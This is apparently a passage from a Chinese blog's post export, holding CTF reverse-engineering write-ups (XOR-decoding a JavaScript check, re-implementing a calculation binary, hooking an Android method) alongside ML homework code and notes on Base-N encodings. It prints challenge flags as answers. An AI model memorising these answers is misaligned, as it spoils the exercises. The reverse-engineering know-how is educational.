b\nprint(flag.decode())\n'''\nl3ts_m4k3_4_DETOUR_t0d4y\n'''\n```\n\n所以我上面那个脚本为什么错了啊？我搞不懂，牛牛救命！\n\n","categories":["Windows逆向"],"tags":["Reverse","CTF"]},{"title":"k-近邻算法","url":"/posts/e955b133.html","content":"\n这周又来个新作业，k-近邻算法手算很容易，但用代码实现确实有点困难了。只能在网上找找参考：https://github.com/zlxy9892/ml_code/blob/master/basic_algorithm/knn 看能不能看懂牛牛们写的算法吧。\n\n<!--more-->\n\n```python\n# -*- coding: utf-8 -*-\n# knn.py\nimport numpy as np\nimport operator\n\nclass KNN(object):\n\t#取3个近邻点\n    def __init__(self, k=3):\n        self.k = k\n\n    def fit(self, x, y):\n        self.x = x\n        self.y = y\n\n    def _square_distance(self, v1, v2):\n        return np.sum(np.square(v1-v2))\n\n    def _vote(self, ys):\n        ys_unique = np.unique(ys)\n        vote_dict = {}\n        for y in ys:\n            if y not in vote_dict.keys():\n                vote_dict[y] = 1\n            else:\n                vote_dict[y] += 1\n        sorted_vote_dict = sorted(vote_dict.items(), key=operator.itemgetter(1), reverse=True)\n        return sorted_vote_dict[0][0]\n\n    def predict(self, x):\n        y_pred = []\n        for i in range(len(x)):\n            dist_arr = [self._square_distance(x[i], self.x[j]) for j in range(len(self.x))]\n            sorted_index = np.argsort(dist_arr)\n            top_k_index = sorted_index[:self.k]\n            y_pred.append(self._vote(ys=self.y[top_k_index]))\n        return np.array(y_pred)\n\n    def score(self, y_true=None, y_pred=None):\n        if y_true is None and y_pred is None:\n            y_pred = self.predict(self.x)\n            y_true = self.y\n        score = 0.0\n        for i in range(len(y_true)):\n            if y_true[i] == y_pred[i]:\n                score += 1\n        score /= len(y_true)\n        return score\n```\n\n```python\n# -*- coding: utf-8 -*-\n# train.py\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom knn import *\n\n\n# data generation\nnp.random.seed(314)\n\n# 创建第一个数据集\ndata_size_1 = 300\nx1_1 = np.random.normal(loc=5.0, scale=1.0, size=data_size_1)\nx2_1 = np.random.normal(loc=4.0, scale=1.0, size=data_size_1)\ny_1 = [0 for _ in range(data_size_1)]\n\n# 创建第二个数据集\ndata_size_2 = 400\nx1_2 = np.random.normal(loc=10.0, scale=2.0, size=data_size_2)\nx2_2 = np.random.normal(loc=8.0, scale=2.0, size=data_size_2)\ny_2 = [1 for _ in range(data_size_2)]\n\nx1 = np.concatenate((x1_1, x1_2), axis=0)\nx2 = np.concatenate((x2_1, x2_2), axis=0)\nx = np.hstack((x1.reshape(-1,1), x2.reshape(-1,1)))\ny = np.concatenate((y_1, y_2), axis=0)\n\ndata_size_all = data_size_1+data_size_2\nshuffled_index = np.random.permutation(data_size_all)\nx = x[shuffled_index]\ny = y[shuffled_index]\n\nsplit_index = int(data_size_all*0.7)\nx_train = x[:split_index]\ny_train = y[:split_index]\nx_test = x[split_index:]\ny_test = y[split_index:]\n\n# visualize data\nplt.scatter(x_train[:,0], x_train[:,1], c=y_train, marker='.')\nplt.show()\nplt.scatter(x_test[:,0], x_test[:,1], c=y_test, marker='.')\nplt.show()\n\n# data preprocessing\nx_train = (x_train - np.min(x_train, axis=0)) / (np.max(x_train, axis=0) - np.min(x_train, axis=0))\nx_test = (x_test - np.min(x_test, axis=0)) / (np.max(x_test, axis=0) - np.min(x_test, axis=0))\n\n# knn classifier\nclf = KNN(k=3)\nclf.fit(x_train, y_train)\n\nprint('train accuracy: {:.3}'.format(clf.score()))\n\ny_test_pred = clf.predict(x_test)\nprint('test accuracy: {:.3}'.format(clf.score(y_test, y_test_pred)))\n```\n\n很高级，完全看不懂。\n\n{% asset_img 1.png 图形1 %}\n\n{% asset_img 2.png 图形2 %}\n\n{% asset_img 3.png 结果 %}","categories":["算法"],"tags":["Python","机器学习"]},{"title":"攻防世界 逆向高手进阶区","url":"/posts/5a99a36.html","content":"\n新手练习区完结，高手进阶区有些也做过了。如果在这里找不到笔记，请到[小凉的CSDN博客](https://blog.csdn.net/Leong_Vinson)去找，如果没有那就真没有了。\n\n<!--more-->\n\n# 1. secret-string-400\n\n下载下来是个`.gz`文件，拖进kali解压，发现又是一个压缩文件，继续解压。\n\n```\n                    \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ gzip -d secret.gz  \n                                                                             \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ file secret\nsecret: POSIX tar archive\n                                                                             \n┌──(v5le0n9㉿kali)-[~/Desktop]\n└─$ tar -xvf secret\n./._Task.html\nTask.html\n./._Machine.js\nMachine.js\n```\n\n解压出来一个html文件和一个js文件。打开html文件输入字符串试试，啥都没有。要我们输入一个无效字符串才可以得到flag。\n\n{% asset_img 1.1.png 输入字符串 %}\n\n打开js分析check()函数。\n\n{% asset_img 1.2.png js代码 %}\n\nloadcode()用来加载aardio代码，或一个aardio代码文件，并创建一个函数对象。函数原型：\n\n```\n函数对象,错误信息 = loadcode(codeString | filepath)\n```\n\n参数可以是包含aardio代码的字符串值，也可以是aardio代码文件的路径。路径可以用斜杠作为首字符表示应用程序根目录。该函数并不立即执行代码，而是返回一个函数对象。如果加载代码失败，则返回的函数对象为null值，并在第二个返回值中返回错误信息。\n\n所以那些数字其实是aardio代码。先去到run函数看看。\n\n{% asset_img 1.3.png js代码 %}\n\n{% asset_img 1.4.png js代码 %}\n\n救...js我实在不会啊！看了牛牛们的wp，通过修改js文件将命令参数打印在Console中。在run函数中加入代码：\n\n```javascript\nconsole.log('new Opcode' + command.args)\n```\n\n{% asset_img 1.5.png js代码 %}\n\n运行一下，在Console中就可以看到被解析出来的代码了。\n\n{% asset_img 1.6.png console %}\n\n```javascript\nvar f=window.machine.registers[1].userinput//\nvar i = f.length//\nvar nonce = 'groke';//\nvar j = 0;//\nvar out = [];//\nvar eq = true;//\nwhile(j < i){//\n\tout.push(f.charCodeAt(j) ^ nonce.charCodeAt(j%5))//\n\tj++;//\n}//\nvar ex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];//\nif (ex.length == out.length) {//\n\tj = 0;//\n\twhile(j < ex.length){//\n\t\tif(ex[j] != out[j])//\n\t\t\teq = false;//\n\t\tj += 1;//\n\t}//\n\tif(eq){//\n\t\talert('YOU WIN!');//\n\t}else{\n\t\talert('NOPE!');\n\t}\n}else{alert('NOPE!');}//\n```\n\n这些代码我就看懂了。输入的长度与ex长度要相等，经过异或算法最终要与ex中的元素相等。马上编写逆向脚本：\n\n```python\nex =  [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60]\nnonce = list('groke')\nflag = \"\"\nfor i in range(len(ex)):\n    flag += chr(ex[i] ^ ord(nonce[i%5]))\nprint(flag)\n'''\nflag is: WOW_so_EASY\n'''\n```\n\n```\nWOW_so_EASY\n```\n\n原来这就是Web逆向嘛，呜呜呜呜js硬伤啊\n\n# 2. Newbie_calculations\n\n运行一下，发现输入不了任何东西。载入OD，发现每隔一段时间暂停一下它会停在不同的地址，说明这个程序一直在运行，而不是等待我们输入。\n\n载入IDA查看伪代码，发现它在不停地调用这几个函数。\n\n{% asset_img 2.1.png IDA分析 %}\n\n一个个进去看，反编译乱死了...\n\n{% asset_img 2.2.png IDA分析 %}\n\n{% asset_img 2.3.png IDA分析 %}\n\n{% asset_img 2.4.png IDA分析 %}\n\n知道每个函数的作用后，抄一遍代码：\n\n```python\ndef mul_401100(a,b):\n    return a*b\ndef sub_401220(a,b):\n    return a-b\ndef add_401000(a,b):\n    return a+b\nflag=[1 for i in range(32)]\nv121 = 0\nprint(\"Your flag is:\")\nv3 = mul_401100(flag[0], 0x3B9ACA00)\nv4 = sub_401220(v3, 0x3B9AC9CE)\nflag[0]=mul_401100(v4, 2)\nv5 = add_401000(flag[1], 0x4C4B40)\nv6 = sub_401220(v5, 0x65B9AA)\nv7 = add_401000(v6, 1666666)\nv8 = add_401000(v7, 45)\nv9 = mul_401100(v8, 2)\nflag[1]=add_401000(v9, 5)\nv10 = mul_401100(flag[2], 0x3B9ACA00)\nv11 = sub_401220(v10, 999999950)\nv12 = mul_401100(v11, 2)\nflag[2]=add_401000(v12, 2)\nv13 = add_401000(flag[3], 55)\nv14 = sub_401220(v13, 3)\nv15 = add_401000(v14, 4)\nflag[3]=sub_401220(v15, 1)\nv16 = mul_401100(flag[4], 100000000)\nv17 = sub_401220(v16, 99999950)\nv18 = mul_401100(v17, 2)\nflag[4]=add_401000(v18, 2)\nv19 = sub_401220(flag[5], 1)\nv20 = mul_401100(v19, 1000000000)\nv21 = add_401000(v20, 55)\nflag[5]=sub_401220(v21, 3)\nv22 = mul_401100(flag[6], 1000000)\nv23 = sub_401220(v22, 999975)\nflag[6]=mul_401100(v23, 4)\nv24 = add_401000(flag[7], 55)\nv25 = sub_401220(v24, 33)\nv26 = add_401000(v25, 44)\nflag[7]=sub_401220(v26, 11)\nv27 = mul_401100(flag[8], 10)\nv28 = sub_401220(v27, 5)\nv29 = mul_401100(v28, 8)\nflag[8]=add_401000(v29, 9)\nv30 = add_401000(flag[9], 0)\nv31 = sub_401220(v30, 0)\nv32 = add_401000(v31, 11)\nv33 = sub_401220(v32, 11)\nflag[9]=add_401000(v33, 53)\nv34 = add_401000(flag[10], 49)\nv35 = sub_401220(v34, 2)\nv36 = add_401000(v35, 4)\nflag[10]=sub_401220(v36, 2)\nv37 = mul_401100(flag[11], 1000000)\nv38 = sub_401220(v37, 999999)\nv39 = mul_401100(v38, 4)\nflag[11]=add_401000(v39, 50)\nv40 = add_401000(flag[12], 1)\nv41 = add_401000(v40, 1)\nv42 = add_401000(v41, 1)\nv43 = add_401000(v42, 1)\nv44 = add_401000(v43, 1)\nv45 = add_401000(v44, 1)\nv46 = add_401000(v45, 10)\nflag[12]=add_401000(v46, 32)\nv47 = mul_401100(flag[13], 10)\nv48 = sub_401220(v47, 5)\nv49 = mul_401100(v48, 8)\nv50 = add_401000(v49, 9)\nflag[13]=add_401000(v50, 48)\nv51 = sub_401220(flag[14], 1)\nv52 = mul_401100(v51, -294967296)\nv53 = add_401000(v52, 55)\nflag[14]=sub_401220(v53, 3)\nv54 = add_401000(flag[15], 1)\nv55 = add_401000(v54, 2)\nv56 = add_401000(v55, 3)\nv57 = add_401000(v56, 4)\nv58 = add_401000(v57, 5)\nv59 = add_401000(v58, 6)\nv60 = add_401000(v59, 7)\nflag[15]=add_401000(v60, 20)\nv61 = mul_401100(flag[16], 10)\nv62 = sub_401220(v61, 5)\nv63 = mul_401100(v62, 8)\nv64 = add_401000(v63, 9)\nflag[16]=add_401000(v64, 48)\nv65 = add_401000(flag[17], 7)\nv66 = add_401000(v65, 6)\nv67 = add_401000(v66, 5)\nv68 = add_401000(v67, 4)\nv69 = add_401000(v68, 3)\nv70 = add_401000(v69, 2)\nv71 = add_401000(v70, 1)\nflag[17]=add_401000(v71, 20)\nv72 = add_401000(flag[18], 7)\nv73 = add_401000(v72, 2)\nv74 = add_401000(v73, 4)\nv75 = add_401000(v74, 3)\nv76 = add_401000(v75, 6)\nv77 = add_401000(v76, 5)\nv78 = add_401000(v77, 1)\nflag[18]=add_401000(v78, 20)\nv79 = mul_401100(flag[19], 1000000)\nv80 = sub_401220(v79, 999999)\nv81 = mul_401100(v80, 4)\nv82 = add_401000(v81, 50)\nflag[19]=sub_401220(v82, 1)\nv83 = sub_401220(flag[20], 1)\nv84 = mul_401100(v83, -294967296)\nv85 = add_401000(v84, 49)\nflag[20]=sub_401220(v85, 1)\nv86 = sub_401220(flag[21], 1)\nv87 = mul_401100(v86, 1000000000)\nv88 = add_401000(v87, 54)\nv89 = sub_401220(v88, 1)\nv90 = add_401000(v89, 1000000000)\nflag[21]=sub_401220(v90, 1000000000)\nv91 = add_401000(flag[22], 49)\nv92 = sub_401220(v91, 1)\nv93 = add_401000(v92, 2)\nflag[22]=sub_401220(v93, 1)\nv94 = mul_401100(flag[23], 10)\nv95 = sub_401220(v94, 5)\nv96 = mul_401100(v95, 8)\nv97 = add_401000(v96, 9)\nflag[23]=add_401000(v97, 48)\nv98 = add_401000(flag[24], 1)\nv99 = add_401000(v98, 3)\nv100 = add_401000(v99, 3)\nv101 = add_401000(v100, 3)\nv102 = add_401000(v101, 6)\nv103 = add_401000(v102, 6)\nv104 = add_401000(v103, 6)\nflag[24]=add_401000(v104, 20)\nv105 = add_401000(flag[25], 55)\nv106 = sub_401220(v105, 33)\nv107 = add_401000(v106, 44)\nv108 = sub_401220(v107, 11)\nflag[25]=add_401000(v108, 42)\nflag[26]=add_401000(flag[26], flag[25])\nflag[27]=add_401000(flag[27], flag[12])\nv109 = flag[27]\nv110 = sub_401220(flag[28], 1)\nv111 = add_401000(v110, v109)\nflag[28]=sub_401220(v111, 1)\nv112 = flag[23]\nv113 = sub_401220(flag[29], 1)\nv114 = mul_401100(v113, 1000000)\nflag[29]=add_401000(v114, v112)\nv115 = flag[27]\nv116 = add_401000(flag[30], 1)\nflag[30]=mul_401100(v116, v115)\nflag[31]=add_401000(flag[31], flag[30])\nprint(\"CTF{\"+''.join(map(chr,flag))+\"}\")\n'''\nYour flag is:\nCTF{daf8f4d816261a41a115052a1bc21ade}\n'''\n```\n\n# 3. easyre-153\n\n查壳，UPX壳，拖进Ubuntu输入脱壳命令直接脱掉。\n\n{% asset_img 3.1.png UPX脱壳 %}\n\nhttps://blog.csdn.net/xiao__1bai/article/details/120360202","categories":["Windows逆向"],"tags":["Reverse","OllyDbg","x64dbg"]},{"title":"感知机学习算法","url":"/posts/2670ba0d.html","content":"\n机器学习的第一个作业，写完纸质还有时间，那就用Python写算法试试咯，老师说后面有真正的实验报告，先用Python写一下熟悉熟悉，回顾一下前几天学的Python吧。\n\n<!--more-->\n\n```python\n#感知机学习算法\ndef ganzhiji(lst,n,w,b):\n    result = [-1]\n    while(''.join(str(result)).count('-')!=0):\n        result.clear()\n        for x in lst:\n            sum = x[2] * (w[0]*x[0] + w[1]*x[1] + b)\n            result.append(sum)\n            if sum > 0:\n                print(\"对({0},{1})T\".format(x[0],x[1]))\n                print(\"y(wx + b) = {0}({1}*{2} + {3}*{4} + {5}) > 0\".format(x[2],w[0],x[0],w[1],x[1],b), end=\"，\")\n                print(\"({0},{1})T被正确分类\".format(x[0], x[1]))\n                print()\n            else:\n                print(\"对({0},{1})T\".format(x[0],x[1]))\n                print(\"y(wx + b) = {0}({1}*{2} + {3}*{4} + {5}) <= 0\".format(x[2],w[0],x[0],w[1],x[1],b), end=\"，\")\n                print(\"({0},{1})T未被正确分类，更新w和b\".format(x[0], x[1]))\n                w[0] = w[0] + n*x[2]*(x[0])\n                w[1] = w[1] + n*x[2]*(x[1])\n                b = b + n*x[2]\n                print(\"w = ({0},{1})T, b = {2}\".format(w[0],w[1],b))\n                print(\"得到线性模型：{0}x(1) + {1}x(2) + {2}\".format(w[0],w[1],b))\n                print()\n\nif __name__ == '__main__':\n    #lst = [[4,3,1],[4,4,1],[3,1,-1]]\n    #n = 1\n    w = [0,0]\n    b = 0\n    \n    print(\"该算法默认权值w和偏置b都从0开始\")\n    lst = []\n    while(True):\n        z = input(\"输入数据集，比如(x,y)=[3,1,-1]输入3 1 -1，输入end结束：\")\n        x_list = z.split(' ')\n        if ''.join(x_list) == \"end\":\n            break\n        for i in range(len(x_list)):\n            x_list[i] = int(x_list[i])\n        lst.append(x_list)\n    n = int(input(\"算法的学习率为(0<n<=1)：\"))\n    ganzhiji(lst,n,w,b)\n```\n\n","categories":["算法"],"tags":["Python","机器学习"]},{"title":"Base系列算法","url":"/posts/6b338c34.html","content":"\n玩着玩着CTF发现我基础太差了，很多基本原理算法都没有摸清，因为以前大多数用工具就可以解出来，所以没有太在意算法之类，但我最近遇到了一道题，它的Base64映射表换一下我就完全摸不着头脑。所以这篇笔记就来了。\n\n<!--more-->\n\n# 1. Base64\n\n将三个byte的数据，先后放入一个24bit的缓冲区中，先来的byte占高位。数据不足3byte的话，于缓冲器中剩下的bit用0补足。然后，每次取出6（因为$2^6=64$）个bit，按照其值选择索引表中的字符作为编码后的输出。不断进行，直到全部输入数据转换完成。需要注意的是，补4bit后面两个等号，补2bit后面一个等号。这样在解码时，如果有一个等号就往前删2bit无效位，两个等号往前删4bit无效位。\n\n当原数据长度不是3的整数倍时，如果最后剩下一个输入数据，在编码结果后加2个“=”；如果最后剩下两个输入数据，编码结果后加1个“=”；如果没有剩下任何数据，就什么都不要加，这样才可以保证数据还原的正确性。\n\nBase64的编码范围是`A-Za-z0-9+/`，Base64索引表：\n\n{% asset_img 1.1.png Base64索引表 %}\n\n例如“Man”：\n\n{% asset_img 1.2.png Man_Base64 %}\n\n例如“A”和“BC”：\n\n{% asset_img 1.3.png A_BC_Base64 %}\n\nPython版Base64加解密：\n\n```python\nimport base64\nimport string\n# base 字符集\nbase64_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/'\n# base64_charset = \"vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/\"\n\ndef encode(origin_bytes):\n\n     # 将每⼀位bytes转换为二进制字符串，用bin转换后是0b开头的，所以把0b替换了，首位补0补齐8位\n    base64_bytes = ['{:0>8}'.format(str(bin(b)).replace('0b', '')) for b in origin_bytes]\n     \n    resp = ''\n    nums = len(base64_bytes) // 3\n    remain = len(base64_bytes) % 3     \n    integral_part = base64_bytes[0:3 * nums]\n    \n    while integral_part:\n         # 取三个字节，以每6⽐特，转换为4个整数\n         tmp_unit = ''.join(integral_part[0:3])\n         tmp_unit = [int(tmp_unit[x: x + 6], 2) for x in [0, 6, 12, 18]]\n         # 取对应base64字符\n         resp += ''.join([base64_charset[i] for i in tmp_unit])\n         integral_part = integral_part[3:]\n    \n    if remain:\n         # 补⻬三个字节，每个字节补充 0000 0000\n         remain_part = ''.join(base64_bytes[3 * nums:]) + (3 - remain) * '0' * 8\n         # 取三个字节，以每6⽐特，转换为4个整数\n         # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充=\n         tmp_unit = [int(remain_part[x: x + 6], 2) for x in [0, 6, 12, 18]][:remain + 1]\n         resp += ''.join([base64_charset[i] for i in tmp_unit]) + (3 - remain) * '='\n    \n    return resp\n\ndef decode(base64_str):\n    if not valid_base64_str(base64_str):\n        return bytearray()\n    \n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b','')) for s in base64_str if s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n    \n    while integral_part:\n         # 取4个6位base64字符，作为3个字节\n         tmp_unit = ''.join(integral_part[0:4])\n         tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n         for i in tmp_unit:\n            resp.append(i)\n         integral_part = integral_part[4:]\n \n    if remain:\n         remain_part = ''.join(base64_bytes[nums * 4:])\n         tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n         for i in tmp_unit:\n         \tresp.append(i)\n    return resp\n\ndef valid_base64_str(b_str):\n    if len(b_str) % 4:\n     \treturn False\n    for m in b_str:\n     \tif m != \"=\" and m not in base64_charset:\n     \t\treturn False\n    return True\n\nif __name__ == '__main__':\n     local_base64 = \"MDUzOTdjNDJmOWI2ZGE1OTNhMzY0NDE2MmQzNmViMDE=\"\n     print('使用本地base64解密：', decode(local_base64).decode())\n'''\n使用本地base64解密： 05397c42f9b6da593a3644162d36eb01\n'''\n```\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b64encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b64decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b64encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b64decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'5L2g5aW9IXY1bGUwbjk='\n你好!v5le0n9\n5L2g5aW9IXY1bGUwbjk=\n你好!v5le0n9\n'''\n```\n\n# 2. Base32\n\nBase32编码使用32个ASCII字符对任何数据进行编码，Base32与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每5个比特为一组进行切分($2^5=32$)，每一组内的5个比特可转换到指定的32个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。\n\nBase32的编码范围有两种，比较常用的是`A-Z2-7`，还有一种十六进制字符表`0-9A-V`。既然它是按5个比特切分，肯定需要填充字符，填充字符也是等号。等号可能有6个、4个、3个、1个。\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好v5le0n9\"\n\nbs = base64.b32encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b32decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b32encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b32decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'4S62BZNFXV3DK3DFGBXDS==='\n你好v5le0n9\n4S62BZNFXV3DK3DFGBXDS===\n你好v5le0n9\n'''\n```\n\n# 3. Base16\n\nBase16编码使用16个ASCII字符对任何数据进行编码，Base16与Base64的实现原理类似，同样是将原数据二进制形式取指定位数转换为ASCII码。首先获取数据的二进制形式，将其串联起来，每4个比特为一组进行切分，所以不用填充符，每一组内的4个比特可转换到指定的16个ASCII字符中的一个，将转换后的ASCII字符连接起来，就是编码后的数据。\n\nBase16依赖更小的字典，Base16编码时每4个字符为一个分组，字典的长度为$2^4=16$，字典值如下：\n\n| Value | Encoding | Value | Encoding | Value | Encoding | Value | Encoding |\n| ----- | -------- | ----- | -------- | ----- | -------- | ----- | -------- |\n| 0     | 0        | 4     | 4        | 8     | 8        | 12    | C        |\n| 1     | 1        | 5     | 5        | 9     | 9        | 13    | D        |\n| 2     | 2        | 6     | 6        | 10    | A        | 14    | E        |\n| 3     | 3        | 7     | 7        | 11    | B        | 15    | F        |\n\n使用Python中的Base64模块加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b16encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b16decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b16encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b16decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'E4BDA0E5A5BD2176356C65306E39'\n你好!v5le0n9\nE4BDA0E5A5BD2176356C65306E39\n你好!v5le0n9\n'''\n```\n\n# 4. Base58\n\n前三种Base都是用比特切分的方法来编码与解码，而下面几种都是用辗转相除法来编码和解码的。\n\n与Base64一样，Base58编码的作用也是将非可视字符可视化（ASCII化）。但不同的是Base58编码去掉了几个看起来会产生歧义的字符，如 0 (零), O (大写字母O), I (大写的字母i) and l (小写的字母L) ，和几个影响双击选择的字符，如/, +。结果字符集正好58个字符(包括9个数字，24个大写字母，25个小写字母)。而且因为58不是2的整次幂，所以没有使用类似Base64编码中使用直接截取3个字符转4个字符（$3*8=4*6$ , 2的6次方刚好64）的方法进行转换，而是采用我们数学上经常使用的进制转换方法——辗转相除法（本质上，Base64编码是64进制，Base58是58进制）。看下Base58的编码表：\n\n{% asset_img 2.1.png Base58索引表 %}\n\n也就是字符1代表0，字符2代表1,字符3代表2...字符z代表57。然后回一下辗转相除法。\n\n如要将1234转换为58进制；\n\n第一步：1234除于58，商21，余数为16，查表得H\n\n第二步：21除于58，商0，余数为21，查表得N\n\n所以得到Base58编码为：NH\n\nPython版Base58加解密：\n\n```python\ndef b58encode(tmp:str) -> str:\n\ttmp = list(map(ord,tmp))\n\ttemp = tmp[0]\n\tbase58 = \"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"\n\tfor i in range(len(tmp)-1):\n\t\ttemp = temp * 256 + tmp[i+1]\n\ttmp = []\n\twhile True:\n\t\ttmp.insert(0,temp % 58)\n\t\ttemp = temp // 58\n\t\tif temp == 0:\n\t\t\tbreak\n\ttemp = \"\"\n\tfor i in tmp:\n\t\ttemp += base58[i]\n\treturn temp\n\ndef b58decode(tmp:str) -> str:\n\timport binascii\n\tbase58 = \"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\"\n\ttemp = []\n\tfor i in tmp:\n\t\ttemp.append(base58.index(i))\n\ttmp = temp[0]\n\tfor i in range(len(temp)-1):\n\t\ttmp = tmp * 58 + temp[i+1]\n\treturn binascii.unhexlify(hex(tmp)[2:].encode(\"utf-8\")).decode(\"UTF-8\")\n\nprint(b58encode(\"ABDCDEFGA\"))\nprint(b58decode(\"qBLiPgShKjap\"))\n'''\nqBLiPgShKjap\nABDCDEFGA\n'''\n```\n\n# 5. Base36\n\nBase36本质上就是36进制，编码范围`0-9A-Z`，只支持整数输入。\n\nPython版Base36加解密：\n\n```python\ndef base36encode(number, alphabet='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'):\n    \"\"\"Converts an integer to a base36 string.\"\"\"\n    if not isinstance(number, (int, int)):\n        raise TypeError('number must be an integer')\n\n    base36 = ''\n    sign = ''\n\n    if number < 0:\n        sign = '-'\n        number = -number\n\n    # 如果输入的整数大于等于0小于36，直接返回索引表中的值\n    if 0 <= number < len(alphabet):\n        return sign + alphabet[number]\n\t\n    # 商，余数 = divmod(被除数，除数)\n    while number != 0:\n        number, i = divmod(number, len(alphabet))\n        base36 = alphabet[i] + base36\n\n    return sign + base36\n\ndef base36decode(number):\n    return int(number, 36)\n\nprint (base36encode(35))\nprint (base36encode(6271023))\nprint (base36decode('3QER3'))\n'''\nZ\n3QER3\n6271023\n'''\n```\n\n# 6. Base62\n\nBase62的编码范围是`0-9a-zA-Z`，同样也是按进制来编码，也是只支持输入整数。\n\nPython版Base62加解密：\n\n```python\nBASE62 = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\ndef base62encode(num, alphabet=BASE62):\n    \"\"\"Encode a positive number into Base X and return the string.\n\n    Arguments:\n    - `num`: The number to encode\n    - `alphabet`: The alphabet to use for encoding\n    \"\"\"\n    if num == 0:\n        return alphabet[0]\n    arr = []\n    arr_append = arr.append  # Extract bound-method for faster access.\n    _divmod = divmod  # Access to locals is faster.\n    base = len(alphabet)\n    while num:\n        num, rem = _divmod(num, base)\n        arr_append(alphabet[rem])\n    arr.reverse()\n    return ''.join(arr)\n\ndef base62decode(string, alphabet=BASE62):\n    \"\"\"Decode a Base X encoded string into the number\n\n    Arguments:\n    - `string`: The encoded string\n    - `alphabet`: The alphabet to use for decoding\n    \"\"\"\n    base = len(alphabet)\n    strlen = len(string)\n    num = 0\n\n    idx = 0\n    for char in string:\n        power = (strlen - (idx + 1))\n        num += alphabet.index(char) * (base ** power)\n        idx += 1\n\n    return num\n\nprint (base62encode(6271023))\nprint (base62decode('qjnx'))\n'''\nqjnx\n6271023\n'''\n```\n\n# 7. Base91\n\n下面这几种我都有点迷惑了，因为很少碰到，所以网上资料也没多少，故只是在此做个记录。\n\nBase91就是91进制，也只能是支持整数输入。\n\n{% asset_img 7.1.png Base91索引表 %}\n\n# 8. Base92\n\nBase92比Base91多了一个字符“\\~”。可支持中文、字母输入。\n\n# 9. Base85\n\nBase85 将4个字节转换为5个字节，数据的增加率为25%，而Base64的数据增加率为33%。用85进制的方式对照ASCII码表进行加密。\n\n{% asset_img 9.1.png Base85索引表 %}\n\n使用Python中的Base64模块进行加解密：\n\n```python\nimport base64\n\ns = \"你好!v5le0n9\"\n\nbs = base64.b85encode(s.encode(\"utf-8\")) # 将字符为unicode编码转换为utf-8编码\nprint(bs)\n\nbbs = str(base64.b85decode(bs), \"utf-8\")\nprint(bbs) # 解码\n\nbs = str(base64.b85encode(s.encode(\"utf-8\")), \"utf-8\")\nprint(bs) # 去掉编码结果前的 b\n\nbbs = str(base64.b85decode(bs), \"utf-8\")\nprint(bbs) # 解码\n'''\nb'<h`KfrM)3`HEd-tZaD'\n你好!v5le0n9\n<h`KfrM)3`HEd-tZaD\n你好!v5le0n9\n'''\n```\n\n","categories":["算法"],"tags":["Python"]},{"title":"Bugku Android逆向合集","url":"/posts/17c1c819.html","content":"\n# 1. signin\n\n运行一下程序。\n\n{% asset_img 1.png 运行程序 %}\n\n<!--more-->\n\n加载进jeb分析：\n\n{% asset_img 2.png jeb分析 %}\n\n那如何获取到flag呢？可以用hook。hook一个方法需要知道：\n\n1. 方法的包名和类名：re.sdnisc2018.sdnisc_apk1.MainActivity\n2. 方法名：getFlag\n3. 方法的参数类型：无\n\n另外还要知道程序的包名：re.sdnisc2018.sdnisc_apk1\n\n{% asset_img 3.png 编写hook代码 %}\n\nLogcat返回getFlag的返回值：\n\n{% asset_img 4.png getFlag返回值 %}\n\n随便找个可以逆序文字的网站，再拿去Base64解码，得到flag：\n\n```\n#逆序后\nZmxhZ3tIZXIzX2k1X3kwdXJfZjFhZ18zOWZiY199\n\n#Base64解码后\nflag{Her3_i5_y0ur_f1ag_39fbc_}\n```\n\n# 2. mobile1\n\n运行程序。\n\n{% asset_img 2.1.png 运行程序 %}\n\n载入jeb分析Java伪代码：\n\n{% asset_img 2.2.png jeb分析 %}\n\n{% asset_img 2.3.png jeb分析 